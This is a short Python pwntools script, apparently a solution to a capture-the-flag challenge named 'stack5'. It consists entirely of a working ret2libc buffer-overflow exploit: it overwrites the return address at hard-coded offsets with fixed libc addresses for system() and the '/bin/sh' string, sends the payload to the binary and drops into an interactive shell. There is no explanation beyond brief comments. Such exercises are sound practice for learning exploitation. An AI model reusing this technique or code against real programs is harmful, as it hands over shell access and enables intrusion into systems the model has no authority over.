# stack5ex.py - Aidan Wech (Onyxymous)
# /problems/stack5r-32_3_19514e7d2c9db2488cb051e873450477/
from pwn import *

# debug info
bin32 = '/problems/stack5r-32_3_19514e7d2c9db2488cb051e873450477/stack5'
elf = ELF(bin32)
context.binary = elf
context.log_level = 'debug'

# exploit string variables
offset1 = 76            # first offset where next 4 bytes hold the return address for the system call
offset2 = 84            # second offset where next 4 bytes hold the address of '/bin/sh' in libc
system = 0xf7e28f10     # address of the system call
binsh = 0xf7f679db      # address of '/bin/sh' in libc

exploit = flat({
offset1: system,
offset2: binsh})

p = process(bin32)
p.sendline(exploit)
p.interactive()
